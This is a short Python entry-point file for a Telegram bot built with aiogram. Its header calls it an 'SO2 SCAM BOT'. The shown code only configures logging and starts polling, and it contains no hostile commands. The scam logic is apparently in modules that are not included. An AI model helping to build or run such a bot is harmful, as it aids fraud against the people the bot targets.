# SO2 SCAM BOT BY github.com/Vlad2030

from aiogram import executor
from loguru import logger

import handlers
from loader import dp

logger.add(
    sink="logs.log",
    enqueue=False,
    backtrace=False,
    catch=False,
)


async def on_startup(dispatcher) -> None:
    logger.success("bot started")


async def on_shutdown(dispatcher) -> None:
    logger.warning("bot shutdown!")


# Запуск бота
if __name__ == "__main__":
    executor.start_polling(
        dispatcher=dp,
        skip_updates=True,
        on_startup=on_startup,
        on_shutdown=on_shutdown,
    )
